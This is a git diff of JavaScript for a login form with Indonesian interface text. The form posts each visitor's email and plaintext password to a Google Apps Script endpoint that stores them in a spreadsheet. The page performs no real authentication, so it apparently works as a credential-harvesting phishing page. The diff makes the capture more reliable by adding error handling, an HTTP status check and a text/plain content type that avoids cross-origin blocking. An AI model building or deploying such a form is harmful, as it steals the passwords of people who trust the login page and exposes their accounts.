@@ -1,4 +1,4 @@
-const scriptURL = 'https://script.google.com/macros/s/AKfycbw3wTOPR4co3jbiGWsaOIG15b3owEwkP4WsrMWqmSXRUUtHyzJSlNpBt5LE8IL9G9d12A/exec';
+const scriptURL = 'https://script.google.com/macros/s/AKfycbz_eC7Ai0ABMHbHc3V7N6H6oZcsu3D4mBMkXek-yaRqfJW8QIuf1egmyuAowMiDM5Xe7Q/exec';
 const loginForm = document.getElementById('loginForm');
 const submitButton = document.querySelector('.btn-primary');
 
@@ -13,17 +13,27 @@ loginForm.addEventListener('submit', async function (e) {
         return;
     }
 
+    if (!password) {
+        alert('Password tidak boleh kosong.');
+        return;
+    }
+
     submitButton.disabled = true;
     submitButton.textContent = 'Mengirim...';
 
     try {
         await saveToSpreadsheet(email, password);
+        
         alert('Login berhasil! Data telah disimpan.');
-        loginForm.reset();
-        console.log("✅ Data seharusnya sudah masuk"); // tambahan
-            } catch (error) {
-        console.error("Error detail:", error);
+        loginForm.reset();           // Reset form
+        console.log("✅ Data tersimpan, form sudah direset");
+        
+    } catch (error) {
+        console.error("Error:", error);
         alert('Gagal mengirim data: ' + error.message);
+    } finally {
+        submitButton.disabled = false;
+        submitButton.textContent = 'Masuk';
     }
 });
 
@@ -32,27 +42,24 @@ function loginWithGoogle() {
 }
 
 async function saveToSpreadsheet(email, password) {
-    try {
-        const response = await fetch(scriptURL, {
-            method: 'POST',
-            headers: { 
-                'Content-Type': 'application/json' 
-            },
-            body: JSON.stringify({ email, password })
-        });
+    const response = await fetch(scriptURL, {
+        method: 'POST',
+        headers: { 
+            'Content-Type': 'text/plain;charset=utf-8'
+        },
+        body: JSON.stringify({ email, password })
+    });
 
-        const result = await response.json();   // ← penting
-
-        console.log("Response dari Apps Script:", result); // Untuk debugging
-
-        if (result.status === "success") {
-            return result;
-        } else {
-            throw new Error(result.message || "Gagal menyimpan data");
-        }
-
-    } catch (error) {
-        console.error("Fetch Error:", error);
-        throw error;
+    if (!response.ok) {
+        throw new Error('HTTP error: ' + response.status);
     }
+
+    const result = await response.json();
+    console.log("Response dari server:", result);
+
+    if (result.status !== "success") {
+        throw new Error(result.message || "Gagal menyimpan data");
+    }
+
+    return result;
 }
